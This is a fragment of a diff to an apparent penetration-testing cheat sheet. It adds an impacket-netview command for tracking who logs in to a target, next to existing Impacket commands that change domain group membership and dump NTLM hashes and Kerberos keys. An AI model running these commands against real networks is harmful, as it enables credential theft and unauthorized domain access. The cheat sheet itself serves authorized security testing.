@@ -334,6 +334,8 @@ impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group -name 'GROUPNAME'
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group -name 'GROUPNAME' -join 'USERNAME'
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group -name 'GROUPNAME' -unjoin 'USERNAME'
+# track of who logged in or 
+impacket-netview -target 'IP' -delay 'SECOND' -ts 'DOMAIN/USERNAME:PASSWORD'
 # dumping NTLM hashs and Kerberos Keys
 impacket-secretsdump -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-secretsdump -ts -just-dc-user 'USERNAME' -just-dc-ntlm 'DOMAIN/USERNAME:PASSWORD@IP'
